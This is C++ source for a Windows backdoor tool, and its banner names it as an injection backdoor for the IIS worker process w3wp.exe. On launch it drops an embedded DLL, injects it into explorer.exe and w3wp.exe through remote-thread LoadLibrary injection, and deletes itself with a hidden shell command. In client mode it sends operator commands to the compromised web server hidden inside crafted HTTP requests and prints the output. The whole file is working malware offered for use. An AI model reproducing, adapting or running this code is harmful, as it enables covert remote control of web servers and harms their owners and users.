// Aiwb.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>
#include "SocketKernel.h"
#include "resource.h"
#define OUT_PATH L"C:\\Documents and Settings\\All Users\\Documents\\Aiwb.dll"

CSocketKernel SocketKernel;
HANDLE g_hMailslot = 0 , g_hEvent = 0;

WCHAR* Ansi2Unicode(char* szMultiByte)  
{  
	int nLen = MultiByteToWideChar(CP_ACP,NULL,szMultiByte,-1,NULL,0);    
	if (0 == nLen)  
		return NULL;
	WCHAR* szWideChar = new WCHAR[nLen];
	MultiByteToWideChar(CP_ACP,NULL,szMultiByte,-1,szWideChar,nLen);
	return szWideChar;  
}

char* Unicode2Ansi(const wchar_t* wszString)  
{  
	int nLen = ::WideCharToMultiByte(CP_ACP, NULL, wszString, wcslen(wszString), NULL, 0, NULL, NULL); 
	if (0 == nLen)  
		return NULL;
	char* szAnsi = new char[nLen + 1];   
	::WideCharToMultiByte(CP_ACP, NULL, wszString, wcslen(wszString), szAnsi, nLen, NULL, NULL);    
	szAnsi[nLen] = 0x00;  
	return szAnsi;  
}

HANDLE secCreateEventPort(WCHAR* szNameEvent)
{
	SECURITY_DESCRIPTOR SecDescriptor = {0};
	SECURITY_ATTRIBUTES SecurityAttributes = {0};
	if (!InitializeSecurityDescriptor(&SecDescriptor,SECURITY_DESCRIPTOR_REVISION))
		return INVALID_HANDLE_VALUE;
	if(!SetSecurityDescriptorDacl(&SecDescriptor,TRUE, NULL, FALSE))
		return INVALID_HANDLE_VALUE;
	SecurityAttributes.bInheritHandle = TRUE;
	SecurityAttributes.lpSecurityDescriptor = &SecDescriptor;
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	return CreateEvent(&SecurityAttributes,TRUE,FALSE,szNameEvent);
}

HANDLE secCreateMailslot(WCHAR* szMailslotName)
{
	SECURITY_DESCRIPTOR SecDescriptor = {0};
	SECURITY_ATTRIBUTES SecurityAttributes = {0};
	if (!InitializeSecurityDescriptor(&SecDescriptor,SECURITY_DESCRIPTOR_REVISION))
		return 0;
	if(!SetSecurityDescriptorDacl(&SecDescriptor,TRUE, NULL, FALSE))
		return 0;
	SecurityAttributes.bInheritHandle = TRUE;
	SecurityAttributes.lpSecurityDescriptor = &SecDescriptor;
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	return CreateMailslot(szMailslotName, 0, 
		MAILSLOT_WAIT_FOREVER, &SecurityAttributes);
}
BOOL EnableDebugPrivilege()
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp;
	BOOL bRet = FALSE;
	bRet = ::OpenProcessToken(::GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &hToken);
	if (!bRet || hToken == NULL)
		return FALSE;
	if (!::LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
	{
		::CloseHandle(hToken);
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	OutputDebugStringA("Error!");
	if (!::AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
	{
		::CloseHandle(hToken);
		return FALSE;
	}
	::CloseHandle(hToken);
	return TRUE;
}
HANDLE GetProcessHandle(int nID)
{
	return OpenProcess(PROCESS_ALL_ACCESS, FALSE, nID);
}
HANDLE GetProcessHandle(LPCTSTR pName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return NULL;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk;
	for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe)) {
		if (!_tcscmp(pe.szExeFile, pName)) {
			CloseHandle(hSnapshot);
			return GetProcessHandle(pe.th32ProcessID);
		}
	}
	return NULL;
}
HANDLE InjectDll( wchar_t* szInjectName , BOOL bInOrUn )
{
	HANDLE hThread;
	char   szLibPath [_MAX_PATH];
	void*  pLibRemote = 0;
	DWORD  hLibModule = 0;
	HANDLE 	hProcess = GetProcessHandle(szInjectName);;
	HMODULE hKernel32 = ::GetModuleHandleA("Kernel32");
	if (!hProcess)
		return 0;
	if( !GetModuleFileNameA( NULL,szLibPath,_MAX_PATH) )
		return FALSE;
	lstrcpyA( strstr(szLibPath,".exe"),".dll" );
	OutputDebugStringA(szLibPath);
	lstrcpyA(szLibPath,Unicode2Ansi(OUT_PATH));
	pLibRemote = ::VirtualAllocEx( hProcess, NULL, sizeof(szLibPath), MEM_COMMIT, PAGE_READWRITE );
	if( pLibRemote == NULL )
	{
		OutputDebugString(L"VirtualAllocEx Error!");
		return 0;
	}
	::WriteProcessMemory(hProcess, pLibRemote, (void*)szLibPath,sizeof(szLibPath),NULL);

	hThread = ::CreateRemoteThread( hProcess, NULL, 0,	
		(LPTHREAD_START_ROUTINE) ::GetProcAddress(hKernel32,"LoadLibraryA"), 
		pLibRemote, 0, NULL );
	if( hThread == NULL )
	{
		OutputDebugString(L"CreateRemoteThread Error!");
		return 0;
	}
	OutputDebugStringA("Inject library OK");
	::WaitForSingleObject( hThread, INFINITE );
	::GetExitCodeThread( hThread, &hLibModule );
	::CloseHandle( hThread );
	return (HANDLE)hLibModule;
}
BOOL UnLoadDll(HANDLE hLibModule,WCHAR* szInjectName)
{
	HANDLE hThread;
	char   szLibPath [_MAX_PATH];
	void*  pLibRemote = 0;
	DWORD  hModule = 0;
	HANDLE 	hProcess = GetProcessHandle(szInjectName);;
	HMODULE hKernel32 = ::GetModuleHandleA("Kernel32");
	if (!hProcess)
		return 0;
	::WriteProcessMemory(hProcess, pLibRemote, (void*)szLibPath,sizeof(szLibPath),NULL);

	hThread = ::CreateRemoteThread( hProcess, NULL, 0,	
		(LPTHREAD_START_ROUTINE) ::GetProcAddress(hKernel32,"FreeLibrary"),
		(LPVOID)hLibModule, 0, NULL );
	if( hThread == NULL ){
		OutputDebugString(L"CreateRemoteThread Error!");
		return FALSE;
	}
	OutputDebugStringA("Unload library OK");
	::WaitForSingleObject( hThread, INFINITE );
	::GetExitCodeThread( hThread, &hModule );
	::CloseHandle( hThread );
	return TRUE;
}
BOOL ResourceToFile( WCHAR *szFileName, WCHAR *szResName, WCHAR* szType)
{
	HRSRC hRes = FindResource(NULL,szResName,szType);
	if(!hRes)
		return FALSE;

	HGLOBAL hgRes = LoadResource(NULL, hRes);
	if(!hgRes)
		return FALSE;

	VOID *pRes = LockResource(hgRes);
	if(!pRes)
		return FALSE;

	DWORD size = SizeofResource(NULL, hRes);
	if(!size)
		return FALSE;

	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, 0, 
		CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, 0);
	if(hFile==INVALID_HANDLE_VALUE)
		return FALSE;
	DWORD dwWrite;

	if(!WriteFile(hFile, pRes, size, &dwWrite, 0))
		return FALSE;

	CloseHandle(hFile);
	GlobalFree(hgRes);
	return TRUE;
}
void Usage(){
	printf("=================================== \n"
		"An inject backdoor to w3wp.exe v0.1\n"
		"Code by R4cky[OpEnWilL] \n"
		"E-mail : R4cky@OpEnWilL.Me\n"
		"Author blog : http://www.7c00.org\n"
		"Server Example : Aiwb.exe\n"
		"Cilent Example : Aiwb.exe -c www.7c00.org \n"
		"=====================================\n\n");
}
void DeleteFileSelf(void)
{
	CHAR _szClean[MAX_PATH]="%ComSpec% /c del /s /q ";
	CHAR szClean[3*MAX_PATH]={0};
	CHAR szExePath[MAX_PATH]={0};
	CHAR szExeShortPath[MAX_PATH]={0};

	ExpandEnvironmentStringsA(_szClean,szClean,MAX_PATH);
	GetModuleFileNameA(NULL,szExePath,MAX_PATH);
	GetShortPathNameA(szExePath,szExeShortPath,MAX_PATH);
	lstrcatA(szClean,szExeShortPath);
	WinExec(szClean,SW_HIDE);
	ExitProcess(0);
}

char* ReplaceStr(char* szURL)
{
	char* lpTemp1 = szURL;
	char* lpTemp2 = NULL;
	char* szTemp = new char[MAX_PATH];
	int nNum = 0;
	lpTemp2 = szTemp;

	for (;lpTemp1[0];lpTemp1++)
		if (lpTemp1[0] == ' ')
			nNum++;

	if (!nNum)
		return szURL;

	for(int i = 0 ; i < nNum ; i++){
		strtok(szURL," ");
		wsprintfA(szTemp,"%s%s",szURL,"%20");
		szTemp += strlen(szTemp);
		szURL += strlen(szURL)+1;
	}
	strcat(szTemp,szURL);
	return lpTemp2;
}
BOOL initConnect(WCHAR* szAddress)
{
	char *szRecvBuffer = (char*)malloc(1024*3);
	char *szSendBuffer = (char*)malloc(1024*3);
	char szInputBuffer[255] = {0};
	char *lpTemp = NULL;
	ZeroMemory(szRecvBuffer,1024*3);
	ZeroMemory(szSendBuffer,1024*3);
	while(TRUE){
		if(!SocketKernel.InitConnect(Unicode2Ansi(szAddress),80))
			return FALSE;
		printf("%S@Administrators >> ",szAddress);
		gets(szInputBuffer);
		wsprintfA(szSendBuffer,
		"GET http://%S/fuckyou1234|%s.1.txt HTTP/1.1\r\n"
		"Host: %S\r\n"
		"Connection: keep-alive\r\n"
		"Accept: */*\r\n"
		"Accept-Language: zh-CN,zh;q=0.8\r\n"
		"Cookie: ABCDEFGHIGKLMNOPQRSTUVWXYZ\r\n\r\n"
		,szAddress,ReplaceStr(szInputBuffer),szAddress);
		SocketKernel.SendData(szSendBuffer,1024*3);
		if (!SocketKernel.RecvData(szRecvBuffer,1024*3)){
			printf("Disconnect! Please reconnect!");
			exit(0);
		}
		lpTemp = strstr(szRecvBuffer,"\r\n\r\n");
		lpTemp += 4;
		lstrcpyA(strstr(lpTemp,"HTTP"),"\0");
		printf("%s\n",lpTemp);
	}
}
int _tmain(int argc, _TCHAR* argv[])
{
	EnableDebugPrivilege();
	TCHAR *szArg = argv[1];
	if (argc<=1){
		ResourceToFile(OUT_PATH,\
			MAKEINTRESOURCE(IDR_RC),MAKEINTRESOURCE(RC_DLL));
		InjectDll(L"explorer.exe",TRUE);
		InjectDll(L"w3wp.exe",TRUE);
		DeleteFileSelf();
		exit(0);
	}
	if (lstrcpy(argv[1],L"-c")){
		Usage();
		if (!initConnect(argv[2]))
			printf("Connect Server fail!");
	}
	else if (lstrcpy(argv[1],L"-h"))
		Usage();
}

